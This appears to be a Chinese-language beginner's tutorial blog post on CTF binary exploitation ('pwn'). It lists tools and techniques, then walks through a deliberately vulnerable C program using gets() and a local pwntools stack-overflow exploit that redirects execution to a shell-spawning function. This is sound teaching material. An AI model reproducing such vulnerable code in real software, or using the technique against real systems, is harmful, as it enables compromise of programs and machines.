@@ -1,0 +1,134 @@
+<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>pwn for beginner | I0gan's blog</title><script src="//unpkg.com/valine/dist/Valine.min.js"></script><script>var config = {"root":"/","path":"search.json"}</script><script src="//unpkg.com/mermaid@8.13.5/dist/mermaid.min.js"></script><script>mermaid.initialize({
+ startOnLoad: true
+ , theme: 'dark'
+});</script><link rel="stylesheet" href="/css/arknights.css"><link rel="stylesheet" href="//unpkg.com/@highlightjs/cdn-assets@11.4.0/styles/atom-one-dark-reasonable.min.css"><style>@font-face {
+ font-family: BenderLight;
+ src: local('Bender'), url("/font/BenderLight.ttf");
+}
+@font-face {
+ font-family: 'JetBrains Mono';
+ src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
+}</style><meta name="generator" content="Hexo 6.3.0"></head><body style="background-image:url(/img/bg.jpg);"><main><header class="closed"><nav><div class="navBtn"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><ol class="navContent"><li class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="Search" spellcheck="false" maxlength="50" type="text" id="search-input"></span></li><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem"><a class="navBlock" href="/about/"><span class="navItemTitle">About</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li><li class="navItem"><a class="navBlock" href="/shell/"><span class="navItemTitle">Shell</span></a></li></ol></nav><div class="search-popup"><div id="search-result"></div></div></header><article><div id="post-bg"><div id="post-title"><h1>pwn for beginner</h1><div id="post-info"><span>First Post: <div class="control"><time datetime="2020-09-12T14:00:05.000Z" id="date"> 2020-09-12</time></div></span><br><span>Last Update: <div class="control"><time datetime="2023-03-15T06:15:19.154Z" id="updated"> 2023-03-15</time></div></span><br><span>Word Count: <div class="control">2.2k</div></span><br><span>Read Time: <div class="control">9 min</div></span></div></div><hr><div id="post-content"><h1 id="二进制pwn方向入门"><a href="#二进制pwn方向入门" class="headerlink" title="二进制pwn方向入门"></a>二进制pwn方向入门</h1><h3 id="0x0-What-is-the-pwn"><a href="#0x0-What-is-the-pwn" class="headerlink" title="0x0 What is the pwn?"></a>0x0 What is the pwn?</h3><p>​	pwn是一个黑客语法的俚语词 ，是指攻破设备或者系统。发音类似“砰”，对黑客而言，这就是成功实施黑客攻击的声音——砰的一声，被“黑”的电脑或手机就被你操纵了 (百度百科)</p>
+<p>​	ctf比赛,想必你已经了解过了,基本方向就分为 web, pwn, reverse, misc, crypto,  android, blockchain， 但主要方向为两个web安全和二进制安全, 那么pwn呢就属于二进制安全的一个分支, pwn的话入门确实相比其他方向的难度要高一点, 基本上ctf的各大比赛pwn与web都占主导位置, ctf的awd模式只有web和pwn, 所以pwn在ctf领域, 是个很不错的选择方向。pwn是二进制漏洞挖掘与利用, 那么在实际中,  各大服务器软件中经常曝出缓冲区溢出漏洞, 有时候ctf比赛中还会直接拿最近曝的cve来出题。pwn的漏洞利用技巧与实际中的二进制安全密不可分。那么该怎么入门pwn呢, 接下来我来为你即将入门的pwn手详细讲解。</p>
+<h2 id="0x1-pwn入门学习准备"><a href="#0x1-pwn入门学习准备" class="headerlink" title="0x1 pwn入门学习准备"></a>0x1 pwn入门学习准备</h2><h4 id="linux学习"><a href="#linux学习" class="headerlink" title="linux学习"></a>linux学习</h4><p>​	先学会使用虚拟机装一下linux系统, 推荐先试试装一下 ubuntu16</p>
+<p>​	了解linux的程序装载和执行</p>
+<p>​	了解linux的elf格式</p>
+<p>​	了解一下程序的堆栈结构</p>
+<h4 id="c-x2F-c-语言学习"><a href="#c-x2F-c-语言学习" class="headerlink" title="c &#x2F; c++语言学习"></a>c &#x2F; c++语言学习</h4><p>​	 基本语法的与简单正向编写</p>
+<h4 id="python语言学习"><a href="#python语言学习" class="headerlink" title="python语言学习"></a>python语言学习</h4><p>​	基本语法就行, 为以后写exp</p>
+<h4 id="汇编语言学习"><a href="#汇编语言学习" class="headerlink" title="汇编语言学习"></a>汇编语言学习</h4><p>​	学一下简单的x86_64汇编指令, 读懂一些简单的就行</p>
+<h4 id="简单逆向"><a href="#简单逆向" class="headerlink" title="简单逆向"></a>简单逆向</h4><p>​	熟悉使用ida软件逆一下简单的程序, 可以先逆一下linux的elf程序</p>
+<h2 id="0x2-工具篇"><a href="#0x2-工具篇" class="headerlink" title="0x2 工具篇"></a>0x2 工具篇</h2><p>工欲善其事,必先利其器。以下工具是pwn需要用的.</p>
+<p>ida : 反汇编绝佳利器, 以后想为程序打patch, 也可以使用它</p>
+<p>pwntools: 用于在python下写pwn利用脚本的库</p>
+<p>pwndbg: 基于python与gdb更直观的调试工具, 方便调试程序</p>
+<p>ROPgadget: 查找偏移的利器</p>
+<p>以上是pwn必备的工具.</p>
+<p>下面是入门后的工具:</p>
+<p>one_gadget: 获取libc的one gadget, 入门之后再了解</p>
+<p>seccomp: 沙箱检测工具, 入门之后再了解</p>
+<p>pwn docker: 已经搭建好的pwn docker镜像, 不用手动搭建pwn环境, 入门之后再换环境吧</p>
+<h2 id="0x3-经典常见技巧学习"><a href="#0x3-经典常见技巧学习" class="headerlink" title="0x3 经典常见技巧学习"></a>0x3 经典常见技巧学习</h2><h4 id="stack"><a href="#stack" class="headerlink" title="stack"></a>stack</h4><p>​	basic stack overflow</p>
+<p>​	leak cannary</p>
+<p>​	ret2text</p>
+<p>​	ret2shellcode</p>
+<p>​	ret2syscall</p>
+<p>​	ret2libc</p>
+<p>​	rop</p>
+<p>​	row</p>
+<p>​	ret2dl-resolve</p>
+<p>…</p>
+<h4 id="fmt"><a href="#fmt" class="headerlink" title="fmt"></a>fmt</h4><p>​	leak (libc , stack, elf)</p>
+<p>​	leak anything anywhere</p>
+<p>​	modify anything anywhere</p>
+<p>​	use it no stack</p>
+<p>…</p>
+<h4 id="heap"><a href="#heap" class="headerlink" title="heap"></a>heap</h4><p>basic heap overflow</p>
+<p>fastbin attack</p>
+<p>unlink</p>
+<p>house of einherjar</p>
+<p>off by one</p>
+<p>off by null</p>
+<p>unsorted bin attack</p>
+<p>uaf (libc.so.2.27 and libc.so.2.23)</p>
+<p>house of roman</p>
+<p>house of orange</p>
+<p>house of *…</p>
+<p>…</p>
+<h3 id="ohters"><a href="#ohters" class="headerlink" title="ohters"></a>ohters</h3><p>python sandbox escape</p>
+<p>iofile attack</p>
+<p>hijack hook (malloc_hook, realloc_hook, free_hook….)</p>
+<p>hijack elf got table</p>
+<p>hijack ld got table</p>
+<p>leak libc by print got</p>
+<p>leak libc by modify IO_2_1_stdout struct</p>
+<p>….</p>
+<h2 id="0x4-入门实例"><a href="#0x4-入门实例" class="headerlink" title="0x4 入门实例"></a>0x4 入门实例</h2><p>这里默认你已经学会了基本的入门准备, pwn环境搭建我也不必多说了吧,百度或者google一下,看别人是怎么搭建pwn环境的。 那一下内容为最简单的stack overflow, 先了解一下stack overflow的劫持实验。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">#include &lt;stdio.h&gt;<br>void vul() &#123;<br>	char arr[16];<br>	gets(arr);<br>&#125;<br>int main()&#123;<br>	vul();<br>	printf(&quot;no error\n&quot;);<br>	return 0;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>保存为a.c 尝试编译一下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">gcc a.c -o pwn<br>./pwn<br>asdfasdfasdfadsjfasdkjfsd<br>*** stack smashing detected ***: terminated<br>fAborted (core dumped)<br></code></pre></td></tr></table></figure>
+
+<p>执行输入超过15个字符就会发现, 不会执行到printf(“no error\n”)函数, 这就是所谓的堆栈溢出漏洞, 那么有时候开发不小心的时候就会造成这种漏洞.我再来个例子。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">#include &lt;stdio.h&gt;<br>#include &lt;stdlib.h&gt;<br><br>void vul() &#123;<br>        char arr[16];<br>        gets(arr);<br>&#125;<br>void target() &#123;<br>        system(&quot;sh&quot;);<br>&#125;<br><br>int main()&#123;<br>        vul();<br>        printf(&quot;no error\n&quot;);<br>        return 0;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>pwn的最终目标都是能够拥有控制权,也就是获得shell, 若我们能够通过输入劫持到target()函数, 那么我们就成功利用了该漏洞劫持程序流程到我们想要执行的代码部分, 也就是执行system函数获得shell.</p>
+<h3 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">gcc --no-stack-protector -no-pie a.c -o pwn<br>./pwn<br></code></pre></td></tr></table></figure>
+
+<p>使用python 写一下exp试试, 如下:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">#! /usr/bin/python3<br>from pwn import *<br><br>sh = process(&#x27;./pwn&#x27;) # 在本地打开程序<br><br>p = b&#x27;A&#x27; * 15  # 构造payload为15个b&#x27;A&#x27;<br>sh.sendline(p) # 发送payload<br><br>sh.interactive() # 与程序进行交互<br></code></pre></td></tr></table></figure>
+
+<p>保存为a.py, 执行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">python3 a.py <br></code></pre></td></tr></table></figure>
+
+<p>执行结果</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">[logan@arch ~]$ <br>[+] Starting local process &#x27;./pwn&#x27;: pid 44257<br>[*] Switching to interactive mode<br>[*] Process &#x27;./pwn&#x27; stopped with exit code 0 (pid 44257)<br>no error<br>[*] Got EOF while reading in interactive<br></code></pre></td></tr></table></figure>
+
+<p>可以发现, 程序正常退出, 既然存在堆栈溢出漏洞, 我们要如何劫持程序流程呢, 那我们只有我们修改寄存器rip就可以实现任意地址执行了,那么就要的了解一下堆栈结构, 当程序调用一个新的函数时, 将会将当前的rip执行到的地址压入堆栈储存起来, 方便函数执行完后在回到原来的执行位置,若我们可以修改这个值, 在执行完函数后就实现了修改rip, 指令就是ret, ret指令相当与pop rip.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">rsp---&gt;+-----------------+<br>       |      buffer     |<br>       +-----------------+<br>       |      ......     |<br>       +-----------------+<br>       |      buffer     |<br>       +-----------------+<br>       |   last func rbp |<br>rbp---&gt;+-----------------+<br>       |     ret addr    |<br>       +-----------------+<br></code></pre></td></tr></table></figure>
+
+<p>我们用gdb来调试一下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">pwndbg stack <br>00:0000│ rax r8 rsp**  0x7fffffffe5a0 ◂— 0x41414141 /* &#x27;AAAA&#x27; */ <br>01:0008│       0x7fffffffe5a8 —▸ 0x401060 (_start) ◂— endbr64  <br>02:0010│ rbp     0x7fffffffe5b0 —▸ 0x7fffffffe5c0 —▸ 0x4011a0 (__libc_csu_init) ◂— endbr64  <br>03:0018│       0x7fffffffe5b8 —▸ 0x401183 (main+14) ◂— lea   rdi, [rip + 0xe7d]<br></code></pre></td></tr></table></figure>
+
+<p>上面我只输入了4个’A’, 若能够构造一个payload覆盖到rbp + 8处, 就可以实现劫持了, 输入24个’A’, 为啥是24呢, 数组长度为16, 然而rbp地址空间长度为8, 要溢出到ret地址, 就事先就输入24个字符。然后再输入8个’B覆盖ret 地址试试, 结果如下:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs plaintext"> RIP  0x401161 (vul+27) ◂— ret    <br>─────────────────────────────────────────────────────────────────────────────────────[ DISASM ]──────────────────────────────────────────────────────────────────────────────────────<br>   0x401152 &lt;vul+12&gt;    mov    rdi, rax<br>   0x401155 &lt;vul+15&gt;    mov    eax, 0<br>   0x40115a &lt;vul+20&gt;    call   gets@plt &lt;0x401050&gt;<br> <br>   0x40115f &lt;vul+25&gt;    nop    <br>   0x401160 &lt;vul+26&gt;    leave  <br> ► 0x401161 &lt;vul+27&gt;    ret    &lt;0x4242424242424242&gt;<br><br></code></pre></td></tr></table></figure>
+
+<p>可以发现, 当执行ret指令时, 我们已经吧rip改成了0x4242424242424242</p>
+<p>而0x42是字符’B’的储存值,若我们想要实现修改为0x01或者其他不可打印的字符, 那么手动是没法输入的, 那只能借用脚本,  将我们第一个使用的exp修改一下, 如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">#! /usr/bin/python3<br>from pwn import *<br><br>sh = process(&#x27;./pwn&#x27;) # 在本地打开程序<br><br>p = b&#x27;A&#x27; * 24  # 构造payload<br>p += b&#x27;\x12\x34\x56\x78&#x27; # 地址中储存高位在左, 内存中储存会为0x78563412<br>gdb.attach(sh)  # gdb调试<br>sh.sendline(p) # 发送payload<br><br>sh.interactive() # 与程序进行交互<br></code></pre></td></tr></table></figure>
+
+<p>我们执行看看, 是否rip 修改为0x78563412呢？</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plaintext"> RBP  0x4141414141414141 (&#x27;AAAAAAAA&#x27;) <br> RSP  0x7fff64449e20 ◂— 0x0 <br> RIP  0x78563412 <br>─────────────────────────────────────────────────────────────────────────────────────[ DISASM ]────────────────────────────────────────────────────────────────────────────────────── <br>Invalid address 0x78563412<br></code></pre></td></tr></table></figure>
+
+<p>果真修改为我们预期的结果</p>
+<p>我们使用objdump指令获取target函数的地址</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">objdump -S pwn | grep target<br>0000000000401162 &lt;target&gt;:<br></code></pre></td></tr></table></figure>
+
+<p>那么如果我们将rip修改为0x401162, 即可实现跳转到目标函数</p>
+<p>修改exp如下:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">#! /usr/bin/python3<br>from pwn import *<br><br>sh = process(&#x27;./pwn&#x27;) # 在本地打开程序<br>p = b&#x27;A&#x27; * 24  # 构造payload<br>p += b&#x27;\x62\x11\x40\x00\x00\x00\x00\x00&#x27; # 0x401162<br>gdb.attach(sh)  # gdb调试<br>sh.sendline(p) # 发送payload<br><br>sh.interactive() # 与程序进行交互<br></code></pre></td></tr></table></figure>
+
+
+
+<h3 id="调试运行"><a href="#调试运行" class="headerlink" title="调试运行"></a>调试运行</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">*RIP  0x401162 (target) ◂— push   rbp<br>─────────────────────────────────────────────────────────────────────────────────────[ DISASM ]──────────────────────────────────────────────────────────────────────────────────────<br>   0x40115f &lt;vul+25&gt;       nop    <br>   0x401160 &lt;vul+26&gt;       leave  <br>   0x401161 &lt;vul+27&gt;       ret    <br> <br> ► 0x401162 &lt;target&gt;       push   rbp<br>   0x401163 &lt;target+1&gt;     mov    rbp, rsp<br>   0x401166 &lt;target+4&gt;     lea    rdi, [rip + 0xe97]<br>   0x40116d &lt;target+11&gt;    call   system@plt &lt;system@plt&gt;<br></code></pre></td></tr></table></figure>
+
+<p>看到现在就运行到了target函数中, 那么就成功劫持了程序流程.好了最终exp如下:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">#! /usr/bin/python3<br>from pwn import *<br><br>sh = process(&#x27;./pwn&#x27;) # 在本地打开程序<br><br>p = b&#x27;A&#x27; * 24  # 构造payload<br>p += p64(0x401162) # target函数地址<br># p64函数会将数值转化为8字节的字符串&#x27;\x62\x11\x40\x00\x00\x00\x00\x00&#x27;<br>sh.sendline(p) # 发送payload<br><br>sh.interactive() # 与程序进行交互<br></code></pre></td></tr></table></figure>
+
+<h3 id="运行结果"><a href="#运行结果" class="headerlink" title="运行结果:"></a>运行结果:</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">[logan@arch share]$ python a.py <br>[+] Starting local process &#x27;./pwn&#x27;: pid 45513<br>[*] Switching to interactive mode<br>$ date<br>Sat 12 Sep 2020 09:25:17 PM CST<br></code></pre></td></tr></table></figure>
+
+
+
+<h2 id="0x5-常用网站推荐"><a href="#0x5-常用网站推荐" class="headerlink" title="0x5 常用网站推荐"></a>0x5 常用网站推荐</h2><p>若以上你能正确调试与利用成功,  那你已经开始入门了, 你需要学习更多的知识了.以下网站是我及其推荐的.</p>
+<p><a target="_blank" rel="noopener" href="https://ctf-wiki.github.io/ctf-wiki/">ctf-wiki</a> : pwn的详细学习路线</p>
+<p><a target="_blank" rel="noopener" href="https://adworld.xctf.org.cn/">攻防世界 </a> : 从入门到高手的刷题网站与国内比赛平台</p>
+<p><a target="_blank" rel="noopener" href="https://buuoj.cn/notifications">buuctf</a> : 刷不完的pwn题网站</p>
+<p><a target="_blank" rel="noopener" href="https://www.ctfhub.com/#/index">ctf-hub</a> : 时刻关注各个赛事</p>
+<p><a target="_blank" rel="noopener" href="https://ctftime.org/">ctf-time</a>: 时刻关注国外赛事</p>
+<p><a target="_blank" rel="noopener" href="https://libc.blukat.me/">libc database</a>: 查询libc版本网站</p>
+<p><a target="_blank" rel="noopener" href="http://i0gan.cn/">i0gan</a> :  本人我的blog, 多多关注其他人的博客, 可以学到很多有用的知识 ^_^</p>
+<div id="paginator"></div></div><div id="post-footer"><div id="pages"><div id="footer-link" style="right: calc(50% - 1px);order: 1;border-right: 1px solid #fe2;padding-left: unset;max-width: calc(50% - 4px);"><a href="/2020/09/13/security/ctf/awd-pwn-attack-script/">← Next awd pwn attack script</a></div><div id="footer-link" style="left: 50%;order: 0;border-left: 1px solid #fe2;padding-right: unset;max-width: calc(50% - 5px);"><a href="/2020/09/11/env/blog/setup-hexo-blog-on-server/">在自己的服务器上搭建hexo blog Prev →</a></div></div></div><details id="reward"><summary>打赏点小钱</summary><div id="alipay"><span>支付宝 | Alipay</span><br><img src="/img/Alipay.png"></div><div id="wechat"><span>微信 | WeChat</span><br><img src="/img/WeChat.png"></div></details><div id="Valine"></div></div><div id="bottom-btn"><a id="to-index" href="#toc-div" title="index">≡</a><a id="to-top" onClick="scrolls.scrolltop();" title="to top" style="opacity: 0; display: none;">∧</a></div></article><aside><div id="aside-top"><div id="about"><a href="/" id="logo"><img src="/images/header.jpg" alt="Logo"></a><h1 id="Dr"><a target="_blank" rel="noopener" href="https://github.com/i0gan">I0gan</a></h1><div id="description"></div></div><div id="aside-block"><div id="toc-div"><h1>INDEX</h1><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BA%8C%E8%BF%9B%E5%88%B6pwn%E6%96%B9%E5%90%91%E5%85%A5%E9%97%A8"><span class="toc-text">二进制pwn方向入门</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x0-What-is-the-pwn"><span class="toc-text">0x0 What is the pwn?</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x1-pwn%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0%E5%87%86%E5%A4%87"><span class="toc-text">0x1 pwn入门学习准备</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#linux%E5%AD%A6%E4%B9%A0"><span class="toc-text">linux学习</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#c-x2F-c-%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0"><span class="toc-text">c &#x2F; c++语言学习</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#python%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0"><span class="toc-text">python语言学习</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0"><span class="toc-text">汇编语言学习</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AE%80%E5%8D%95%E9%80%86%E5%90%91"><span class="toc-text">简单逆向</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x2-%E5%B7%A5%E5%85%B7%E7%AF%87"><span class="toc-text">0x2 工具篇</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x3-%E7%BB%8F%E5%85%B8%E5%B8%B8%E8%A7%81%E6%8A%80%E5%B7%A7%E5%AD%A6%E4%B9%A0"><span class="toc-text">0x3 经典常见技巧学习</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#stack"><span class="toc-text">stack</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#fmt"><span class="toc-text">fmt</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#heap"><span class="toc-text">heap</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ohters"><span class="toc-text">ohters</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x4-%E5%85%A5%E9%97%A8%E5%AE%9E%E4%BE%8B"><span class="toc-text">0x4 入门实例</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BC%96%E8%AF%91"><span class="toc-text">编译</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B0%83%E8%AF%95%E8%BF%90%E8%A1%8C"><span class="toc-text">调试运行</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%90%E8%A1%8C%E7%BB%93%E6%9E%9C"><span class="toc-text">运行结果:</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x5-%E5%B8%B8%E7%94%A8%E7%BD%91%E7%AB%99%E6%8E%A8%E8%8D%90"><span class="toc-text">0x5 常用网站推荐</span></a></li></ol></li></ol></div></div></div><footer><nobr><span class="text-title">ICP</span><a class="text-content" target="_blank" rel="noopener" href="https://beian.miit.gov.cn/">沪ICP备2021037250号-1  </a></nobr><nobr><span class="text-title">©</span><span class="text-content">2022 by i0gan</span></nobr><br></footer></aside></main><canvas id="canvas-dust"></canvas><div id="cursor-container"><div id="cursor-outer"></div><div id="cursor-effect"></div></div><script src="/js/search.js"></script><script class="pjax-js">reset=_=>{new Valine({
+ el: '#Valine'
+ , appId: 'TzNey4n3v0Sx6vdBbytYLoH9-gzGzoHsz'
+ , appKey: 'GIXXrK9zLxt0bZLww1hte0Oq' , placeholder: '此条评论委托企鹅物流发送'
+});code.findCode();mermaid.init(undefined, ('.mermaid'));}</script><script src="//unpkg.com/@highlightjs/cdn-assets@11.4.0/highlight.min.js"></script><script src="/js/arknights.js"></script><script>window.addEventListener("load",()=>{reset()})</script></body></html>
